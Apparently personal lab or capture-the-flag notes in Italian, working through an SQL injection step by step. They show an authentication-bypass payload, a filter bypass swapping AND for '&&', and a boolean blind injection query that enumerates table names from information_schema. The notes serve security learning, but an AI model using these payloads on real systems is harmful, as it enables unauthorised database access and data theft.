select * 
from utenti 
where nome =  'gino' and pass = ' or 1=1 -- -'


-- - capiamo il tipo di sql inj. può essere error based.
-- - payloadsAllTheThings

-- - provando con la union, scopriamo che cc'è un filtro che blocca le query con union e and
-- - la union la scartiamo. possiamo provare a usare l'and bypassandolo con "&&" al posto di "and" oppure usando de morgan.
-- - funziona con &&. notiamo che ritorna un booleano, ma non ne sappiamo il valore. 
-- - quindi dobbiamo andare di blind.ù

select * from posts where id = '1' or 1=1 -- -
-- - ritorna l'articolo

select * from posts where id =  '1' && 2=1 -- -
-- - ritorna "article not found"

-- - possiamo utilizzare questa informazione. possiamo bruteforceare i caratteri tipo nel nome della cartella

select * from posts where id =  '1' && (select hex(table_name) from information_schema.tables where table_schema=DATABASE() limit 1) like '%' -- -

-- - vediamo subito che funziona. Andiamo di python.